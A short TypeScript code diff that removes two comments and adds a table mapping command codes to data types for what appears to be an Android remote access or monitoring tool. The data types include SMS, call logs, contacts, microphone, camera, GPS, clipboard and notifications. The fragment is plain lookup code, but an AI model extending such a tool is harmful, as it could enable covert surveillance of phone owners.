@@ -83,7 +83,6 @@ export const PERMISSION_GROUPS = [
   },
 ];
 
-/** Admin gets all permissions; user gets their assigned list. Fail-closed: returns empty on error. */
 export function resolvePermissions(role: UserRole, permissionsJson: string): Permission[] {
   if (role === 'admin') return [...ALL_PERMISSIONS];
   try {
@@ -95,7 +94,6 @@ export function resolvePermissions(role: UserRole, permissionsJson: string): Per
   }
 }
 
-/** Command protocol codes — matches Android Protocol.java channel codes. */
 export const CMD = {
   FILES: '0xFI',
   SMS: '0xSM',
@@ -115,6 +113,24 @@ export const CMD = {
 } as const;
 
 export type CmdType = typeof CMD[keyof typeof CMD];
+
+export const CMD_TO_DATA_TYPE: Record<CmdType, string> = {
+  [CMD.FILES]: 'files',
+  [CMD.SMS]: 'sms',
+  [CMD.CALLS]: 'calls',
+  [CMD.CONTACTS]: 'contacts',
+  [CMD.MIC]: 'mic',
+  [CMD.LOCATION]: 'gps',
+  [CMD.WIFI]: 'wifi',
+  [CMD.PERMISSIONS]: 'permissions',
+  [CMD.APPS]: 'apps',
+  [CMD.PERM_CHECK]: 'permissions',
+  [CMD.CAMERA]: 'camera',
+  [CMD.CLIPBOARD]: 'clipboard',
+  [CMD.NOTIFICATIONS]: 'notifications',
+  [CMD.FASON]: 'fason',
+  [CMD.INFO]: 'info',
+};
 
 export interface CommandPayload {
   type: CmdType;
